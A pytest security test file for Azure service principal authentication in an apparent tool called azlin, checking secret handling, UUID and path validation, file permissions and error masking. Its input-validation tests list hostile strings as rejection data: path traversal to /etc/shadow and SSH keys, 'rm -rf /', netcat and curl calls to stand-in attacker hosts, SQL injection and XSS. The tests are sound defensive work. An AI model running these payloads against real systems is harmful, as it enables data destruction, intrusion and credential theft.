"""Security tests for service principal authentication.

Tests all 10 P0 security controls as defined in the requirements:
1. SEC-001: No secrets in config files
2. SEC-002: UUID validation (tenant_id, client_id, subscription_id)
3. SEC-003: Certificate permissions (0600/0400)
4. SEC-004: Certificate expiration warnings (<30 days)
5. SEC-005: Log sanitization (mask secrets)
6. SEC-006: No shell=True in subprocess
7. SEC-007: Input validation
8. SEC-008: Config validation rejects inline secrets
9. SEC-009: Secure file operations
10. SEC-010: Error messages don't leak secrets

All tests should FAIL initially until security controls are implemented.
"""

import logging
import warnings
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from azlin.service_principal_auth import (
    ServicePrincipalConfig,
    ServicePrincipalError,
    ServicePrincipalManager,
)


class TestSEC001_NoSecretsInConfigFiles:
    """SEC-001: No secrets shall be stored in configuration files."""

    def test_save_config_strips_client_secret(self, tmp_path):
        """Test that client_secret is stripped when saving config."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="client_secret",
            client_secret="this-secret-should-not-be-saved",
        )

        config_file = tmp_path / "config.toml"
        ServicePrincipalManager.save_config(config, str(config_file))

        # Verify secret is not in file
        content = config_file.read_text()
        assert "this-secret-should-not-be-saved" not in content
        assert "client_secret =" not in content or "# client_secret" in content

    def test_load_config_rejects_inline_client_secret(self, tmp_path):
        """Test that loading config with inline client_secret raises error."""
        config_file = tmp_path / "bad-config.toml"
        config_file.write_text(
            """
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "client_secret"
client_secret = "inline-secret-not-allowed"
"""
        )

        with pytest.raises(
            ServicePrincipalError,
            match="client_secret.*not allowed.*config file.*environment variable",
        ):
            ServicePrincipalManager.load_config(str(config_file))

    def test_save_config_includes_environment_variable_instructions(self, tmp_path):
        """Test that saved config includes instructions for setting env vars."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="client_secret",
            client_secret="secret",
        )

        config_file = tmp_path / "config.toml"
        ServicePrincipalManager.save_config(config, str(config_file))

        content = config_file.read_text()
        assert "AZLIN_SP_CLIENT_SECRET" in content
        assert "export" in content.lower() or "set" in content.lower()

    def test_config_file_does_not_contain_password_patterns(self, tmp_path):
        """Test that config file doesn't contain common password patterns."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="client_secret",
            client_secret="MyP@ssw0rd123!",
        )

        config_file = tmp_path / "config.toml"
        ServicePrincipalManager.save_config(config, str(config_file))

        content = config_file.read_text().lower()
        # Should not contain password-like strings
        forbidden_patterns = [
            "password",
            "secret =",
            "token =",
            "key =",
            "credential =",
        ]
        for pattern in forbidden_patterns:
            assert pattern not in content or f"# {pattern}" in content


class TestSEC002_UUIDValidation:
    """SEC-002: UUID validation for tenant_id, client_id, subscription_id."""

    @pytest.mark.parametrize(
        "field_name,valid_uuid",
        [
            ("client_id", "12345678-1234-1234-1234-123456789012"),
            ("tenant_id", "87654321-4321-4321-4321-210987654321"),
            ("subscription_id", "abcdef00-0000-0000-0000-000000abcdef"),
        ],
    )
    def test_valid_uuid_accepted(self, field_name, valid_uuid):
        """Test that valid UUIDs are accepted."""
        result = ServicePrincipalManager.validate_uuid(valid_uuid)
        assert result is True

    @pytest.mark.parametrize(
        "field_name,invalid_uuid,reason",
        [
            ("client_id", "not-a-uuid", "invalid format"),
            ("client_id", "12345678-1234-1234-1234", "too short"),
            ("tenant_id", "12345678-1234-1234-1234-123456789012-extra", "too long"),
            ("subscription_id", "", "empty string"),
            ("client_id", "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX", "non-hex characters"),
            ("tenant_id", "12345678_1234_1234_1234_123456789012", "wrong separator"),
        ],
    )
    def test_invalid_uuid_rejected(self, field_name, invalid_uuid, reason):
        """Test that invalid UUIDs are rejected."""
        result = ServicePrincipalManager.validate_uuid(invalid_uuid)
        assert result is False, f"UUID validation should fail for {reason}"

    def test_config_validation_rejects_invalid_client_id(self):
        """Test that config with invalid client_id is rejected."""
        config = ServicePrincipalConfig(
            client_id="invalid-client-id",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="certificate",
            certificate_path=Path("/path/to/cert.pem"),
        )

        with pytest.raises(ServicePrincipalError, match="Invalid.*client_id"):
            ServicePrincipalManager.validate_config(config)

    def test_config_validation_rejects_invalid_tenant_id(self):
        """Test that config with invalid tenant_id is rejected."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="not-a-valid-tenant",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="certificate",
            certificate_path=Path("/path/to/cert.pem"),
        )

        with pytest.raises(ServicePrincipalError, match="Invalid.*tenant_id"):
            ServicePrincipalManager.validate_config(config)

    def test_config_validation_rejects_invalid_subscription_id(self):
        """Test that config with invalid subscription_id is rejected."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="12345",
            auth_method="certificate",
            certificate_path=Path("/path/to/cert.pem"),
        )

        with pytest.raises(ServicePrincipalError, match="Invalid.*subscription_id"):
            ServicePrincipalManager.validate_config(config)

    def test_uuid_validation_sql_injection_protection(self):
        """Test that UUID validation protects against SQL injection patterns."""
        malicious_uuids = [
            "12345678-1234-1234-1234-123456789012'; DROP TABLE users; --",
            "' OR '1'='1",
            "1234<script>alert('xss')</script>",
        ]

        for malicious in malicious_uuids:
            result = ServicePrincipalManager.validate_uuid(malicious)
            assert result is False, f"Should reject malicious UUID: {malicious}"


class TestSEC003_CertificatePermissions:
    """SEC-003: Certificate file permissions must be 0600 or 0400."""

    def test_certificate_with_secure_permissions_0600_accepted(self, tmp_path):
        """Test that certificate with 0600 permissions is accepted."""
        cert_file = tmp_path / "cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        # Should not raise
        ServicePrincipalManager.validate_certificate(cert_file)

    def test_certificate_with_secure_permissions_0400_accepted(self, tmp_path):
        """Test that certificate with 0400 permissions is accepted."""
        cert_file = tmp_path / "cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o400)

        # Should not raise
        ServicePrincipalManager.validate_certificate(cert_file)

    @pytest.mark.parametrize(
        "insecure_mode",
        [
            0o644,  # Group/other readable
            0o666,  # World readable/writable
            0o777,  # World rwx
            0o640,  # Group readable
            0o604,  # Other readable
        ],
    )
    def test_certificate_with_insecure_permissions_raises_error(self, tmp_path, insecure_mode):
        """Test that certificate with insecure permissions raises error."""
        cert_file = tmp_path / "insecure-cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(insecure_mode)

        with pytest.raises(ServicePrincipalError, match="insecure permissions.*0600.*0400"):
            ServicePrincipalManager.validate_certificate(cert_file)

    def test_certificate_permissions_auto_fix_option(self, tmp_path):
        """Test that certificate permissions can be auto-fixed when requested."""
        cert_file = tmp_path / "cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o644)

        # Auto-fix permissions
        ServicePrincipalManager.validate_certificate(cert_file, auto_fix=True)

        # Verify permissions were fixed
        mode = cert_file.stat().st_mode & 0o777
        assert mode == 0o600

    def test_config_file_permissions_enforced_0600(self, tmp_path):
        """Test that config files must have 0600 permissions."""
        config_file = tmp_path / "config.toml"
        config_file.write_text(
            """
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "certificate"
certificate_path = "/path/to/cert.pem"
"""
        )
        config_file.chmod(0o644)

        # Should auto-fix and warn
        with pytest.warns(UserWarning, match="insecure permissions"):
            ServicePrincipalManager.load_config(str(config_file))

        # Verify permissions were fixed
        mode = config_file.stat().st_mode & 0o777
        assert mode == 0o600


class TestSEC004_CertificateExpiration:
    """SEC-004: Certificate expiration warnings (<30 days)."""

    def test_certificate_expiring_in_29_days_warns(self, tmp_path):
        """Test that certificate expiring in <30 days triggers warning."""
        cert_file = tmp_path / "expiring-cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        expiry_date = datetime.now() + timedelta(days=29)

        with patch(
            "azlin.service_principal_auth.ServicePrincipalManager._get_certificate_expiration"
        ) as mock_expiry:
            mock_expiry.return_value = expiry_date

            with pytest.warns(UserWarning, match="expires in 29 days"):
                ServicePrincipalManager.validate_certificate(cert_file)

    def test_certificate_expiring_in_31_days_no_warning(self, tmp_path):
        """Test that certificate expiring in >30 days does not warn."""
        cert_file = tmp_path / "valid-cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        expiry_date = datetime.now() + timedelta(days=31)

        with patch(
            "azlin.service_principal_auth.ServicePrincipalManager._get_certificate_expiration"
        ) as mock_expiry:
            mock_expiry.return_value = expiry_date

            # Should not warn - use warnings.catch_warnings instead of pytest.warns(None)
            with warnings.catch_warnings(record=True) as warning_list:
                warnings.simplefilter("always")
                ServicePrincipalManager.validate_certificate(cert_file)

            # Filter for our specific warnings
            relevant_warnings = [w for w in warning_list if "expires" in str(w.message)]
            assert len(relevant_warnings) == 0

    def test_expired_certificate_raises_error(self, tmp_path):
        """Test that expired certificate raises error."""
        cert_file = tmp_path / "expired-cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        expiry_date = datetime.now() - timedelta(days=1)

        with patch(
            "azlin.service_principal_auth.ServicePrincipalManager._get_certificate_expiration"
        ) as mock_expiry:
            mock_expiry.return_value = expiry_date

            with pytest.raises(ServicePrincipalError, match="expired"):
                ServicePrincipalManager.validate_certificate(cert_file)

    def test_certificate_expiration_warning_includes_date(self, tmp_path):
        """Test that expiration warning includes expiration date."""
        cert_file = tmp_path / "expiring-cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        expiry_date = datetime.now() + timedelta(days=15)

        with patch(
            "azlin.service_principal_auth.ServicePrincipalManager._get_certificate_expiration"
        ) as mock_expiry:
            mock_expiry.return_value = expiry_date

            with pytest.warns(UserWarning, match=f"expires.*{expiry_date.strftime('%Y-%m-%d')}"):
                ServicePrincipalManager.validate_certificate(cert_file)


class TestSEC005_LogSanitization:
    """SEC-005: Log sanitization - mask secrets in all log output."""

    def test_log_sanitization_masks_client_secret(self, tmp_path, monkeypatch, caplog):
        """Test that client secrets are masked in logs."""
        config_file = tmp_path / "config.toml"
        config_file.write_text(
            """
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "client_secret"
"""
        )
        config_file.chmod(0o600)

        secret = "super-secret-value-12345"
        monkeypatch.setenv("AZLIN_SP_CLIENT_SECRET", secret)

        with caplog.at_level(logging.DEBUG):
            config = ServicePrincipalManager.load_config(str(config_file))
            ServicePrincipalManager.get_credentials(config)

            # Secret should not appear in logs
            for record in caplog.records:
                assert secret not in record.message
                # If logging about secrets, should be masked
                if "secret" in record.message.lower() or "credential" in record.message.lower():
                    assert "****" in record.message or "[REDACTED]" in record.message

    def test_log_sanitization_masks_certificate_paths_with_sensitive_names(self, tmp_path, caplog):
        """Test that sensitive certificate paths are sanitized."""
        cert_file = tmp_path / "production-secret-key.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        config_file = tmp_path / "config.toml"
        config_file.write_text(
            f"""
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "certificate"
certificate_path = "{cert_file}"
"""
        )
        config_file.chmod(0o600)

        with caplog.at_level(logging.DEBUG):
            config = ServicePrincipalManager.load_config(str(config_file))

            # Sensitive paths should be sanitized
            for record in caplog.records:
                if "certificate" in record.message.lower():
                    # Should not show full path with 'secret' in name
                    assert "production-secret-key.pem" not in record.message or (
                        "****" in record.message
                    )

    def test_log_sanitization_in_error_messages(self, tmp_path, monkeypatch):
        """Test that error messages don't leak secrets."""
        config_file = tmp_path / "config.toml"
        config_file.write_text(
            """
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "client_secret"
"""
        )
        config_file.chmod(0o600)

        secret = "very-secret-password-123"
        monkeypatch.setenv("AZLIN_SP_CLIENT_SECRET", secret)

        # Trigger error scenario
        with patch(
            "azlin.service_principal_auth.ServicePrincipalManager._authenticate_with_secret"
        ) as mock_auth:
            mock_auth.side_effect = Exception(f"Authentication failed with secret: {secret}")

            try:
                config = ServicePrincipalManager.load_config(str(config_file))
                ServicePrincipalManager.get_credentials(config)
            except Exception as e:
                # Error message should not contain secret
                assert secret not in str(e)
                assert "****" in str(e) or "[REDACTED]" in str(e)


class TestSEC006_NoShellTrue:
    """SEC-006: No shell=True in subprocess calls."""

    def test_subprocess_calls_use_shell_false(self, tmp_path, monkeypatch):
        """Test that subprocess calls never use shell=True."""
        cert_file = tmp_path / "cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        config_file = tmp_path / "config.toml"
        config_file.write_text(
            f"""
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "certificate"
certificate_path = "{cert_file}"
"""
        )
        config_file.chmod(0o600)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="OK", stderr="")

            # Trigger subprocess operations
            try:
                config = ServicePrincipalManager.load_config(str(config_file))
                ServicePrincipalManager.validate_certificate(cert_file)
            except Exception:
                pass  # We're testing subprocess calls, not functionality

            # Verify all subprocess calls use shell=False
            for call in mock_run.call_args_list:
                kwargs = call[1]
                assert kwargs.get("shell", False) is False, "subprocess must not use shell=True"

    def test_subprocess_args_are_list_not_string(self, tmp_path):
        """Test that subprocess args are passed as list, not string."""
        cert_file = tmp_path / "cert.pem"
        cert_file.write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----")
        cert_file.chmod(0o600)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="OK", stderr="")

            try:
                ServicePrincipalManager._check_certificate_expiration(cert_file)
            except Exception:
                pass

            # Verify args are list
            for call in mock_run.call_args_list:
                args = call[0]
                if args:
                    assert isinstance(args[0], list), "subprocess args must be list, not string"


class TestSEC007_InputValidation:
    """SEC-007: Input validation for all user-provided values."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "../../etc/passwd",
            "/etc/shadow",
            "../../../root/.ssh/id_rsa",
            "~/../../../etc/passwd",
            "; rm -rf /",
            "| nc attacker.com 1234",
            "$(curl evil.com/malware)",
            "`cat /etc/passwd`",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
        ],
    )
    def test_config_path_validation_rejects_malicious_paths(self, malicious_input):
        """Test that malicious config paths are rejected."""
        with pytest.raises(ServicePrincipalError, match="Invalid.*path"):
            ServicePrincipalManager.load_config(malicious_input)

    def test_certificate_path_validation_rejects_malicious_paths(self):
        """Test that malicious certificate paths are rejected."""
        malicious_paths = [
            "../../etc/passwd",
            "; rm -rf /",
            "| nc evil.com 1234",
        ]

        for malicious_path in malicious_paths:
            config = ServicePrincipalConfig(
                client_id="12345678-1234-1234-1234-123456789012",
                tenant_id="87654321-4321-4321-4321-210987654321",
                subscription_id="abcdef00-0000-0000-0000-000000abcdef",
                auth_method="certificate",
                certificate_path=Path(malicious_path),
            )

            with pytest.raises(ServicePrincipalError, match="Invalid.*certificate.*path"):
                ServicePrincipalManager.validate_config(config)

    def test_environment_variable_name_validation(self):
        """Test that environment variable names are validated."""
        malicious_env_names = [
            "AZLIN_SP_SECRET; malicious_command",
            "VAR`curl evil.com`",
            "VAR$(rm -rf /)",
        ]

        for malicious_name in malicious_env_names:
            result = ServicePrincipalManager._validate_env_var_name(malicious_name)
            assert result is False, f"Should reject malicious env var name: {malicious_name}"


class TestSEC008_ConfigValidationRejectsInlineSecrets:
    """SEC-008: Config validation must reject inline secrets."""

    def test_load_config_with_inline_client_secret_rejected(self, tmp_path):
        """Test that config with inline client_secret is rejected."""
        config_file = tmp_path / "bad-config.toml"
        config_file.write_text(
            """
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "client_secret"
client_secret = "inline-secret"
"""
        )

        with pytest.raises(ServicePrincipalError, match="client_secret.*not allowed"):
            ServicePrincipalManager.load_config(str(config_file))

    def test_save_config_never_includes_client_secret(self, tmp_path):
        """Test that save_config never writes client_secret to file."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="client_secret",
            client_secret="should-not-appear",
        )

        config_file = tmp_path / "config.toml"
        ServicePrincipalManager.save_config(config, str(config_file))

        content = config_file.read_text()
        assert "should-not-appear" not in content


class TestSEC009_SecureFileOperations:
    """SEC-009: Secure file operations with proper permissions."""

    def test_config_directory_created_with_secure_permissions(self, tmp_path, monkeypatch):
        """Test that config directory is created with 0700 permissions."""
        mock_home = tmp_path / "home"
        mock_home.mkdir()
        monkeypatch.setenv("HOME", str(mock_home))

        # Create config which should create .azlin directory
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="certificate",
            certificate_path=Path("/path/to/cert.pem"),
        )

        ServicePrincipalManager.save_config(config)

        # Verify directory permissions
        azlin_dir = mock_home / ".azlin"
        mode = azlin_dir.stat().st_mode & 0o777
        assert mode == 0o700

    def test_atomic_file_writes_prevent_corruption(self, tmp_path):
        """Test that file writes are atomic (write to temp, then rename)."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="certificate",
            certificate_path=Path("/path/to/cert.pem"),
        )

        config_file = tmp_path / "config.toml"

        with patch("os.rename") as mock_rename:
            with patch("pathlib.Path.write_text") as mock_write:
                ServicePrincipalManager.save_config(config, str(config_file))

                # Verify atomic write pattern
                assert mock_rename.called
                temp_file, final_file = mock_rename.call_args[0]
                assert str(final_file) == str(config_file)
                assert ".tmp" in str(temp_file)

    def test_temp_files_cleaned_up_on_error(self, tmp_path):
        """Test that temporary files are cleaned up if save fails."""
        config = ServicePrincipalConfig(
            client_id="12345678-1234-1234-1234-123456789012",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="certificate",
            certificate_path=Path("/path/to/cert.pem"),
        )

        config_file = tmp_path / "config.toml"

        with patch("os.rename") as mock_rename:
            mock_rename.side_effect = OSError("Disk full")

            try:
                ServicePrincipalManager.save_config(config, str(config_file))
            except Exception:
                pass

            # Verify no .tmp files left behind
            tmp_files = list(tmp_path.glob("*.tmp"))
            assert len(tmp_files) == 0


class TestSEC010_ErrorMessagesDontLeakSecrets:
    """SEC-010: Error messages must not leak secrets."""

    def test_authentication_error_masks_secret(self, tmp_path, monkeypatch):
        """Test that authentication errors don't include secrets."""
        config_file = tmp_path / "config.toml"
        config_file.write_text(
            """
[service_principal]
client_id = "12345678-1234-1234-1234-123456789012"
tenant_id = "87654321-4321-4321-4321-210987654321"
subscription_id = "abcdef00-0000-0000-0000-000000abcdef"
auth_method = "client_secret"
"""
        )
        config_file.chmod(0o600)

        secret = "my-super-secret-password"
        monkeypatch.setenv("AZLIN_SP_CLIENT_SECRET", secret)

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = Exception(f"Auth failed for secret: {secret}")

            try:
                config = ServicePrincipalManager.load_config(str(config_file))
                ServicePrincipalManager.get_credentials(config)
            except ServicePrincipalError as e:
                # Error message should not contain secret
                assert secret not in str(e)
                assert "****" in str(e) or "[REDACTED]" in str(e)

    def test_file_not_found_error_masks_sensitive_paths(self):
        """Test that file not found errors don't leak sensitive paths."""
        sensitive_path = "/home/user/.azlin/production-secrets/super-secret-key.pem"

        try:
            ServicePrincipalManager.load_config(sensitive_path)
        except ServicePrincipalError as e:
            error_msg = str(e)
            # Should not reveal full sensitive path
            assert "super-secret-key.pem" not in error_msg or "****" in error_msg

    def test_validation_error_masks_secret_values(self):
        """Test that validation errors don't include secret values."""
        config = ServicePrincipalConfig(
            client_id="invalid-id",
            tenant_id="87654321-4321-4321-4321-210987654321",
            subscription_id="abcdef00-0000-0000-0000-000000abcdef",
            auth_method="client_secret",
            client_secret="my-secret-password",
        )

        try:
            ServicePrincipalManager.validate_config(config)
        except ServicePrincipalError as e:
            # Error should not contain the secret
            assert "my-secret-password" not in str(e)

    def test_exception_repr_masks_secrets(self):
        """Test that exception __repr__ masks secrets."""
        error = ServicePrincipalError("Authentication failed with secret: super-secret-123")

        repr_str = repr(error)
        assert "super-secret-123" not in repr_str
        assert "****" in repr_str or "[REDACTED]" in repr_str
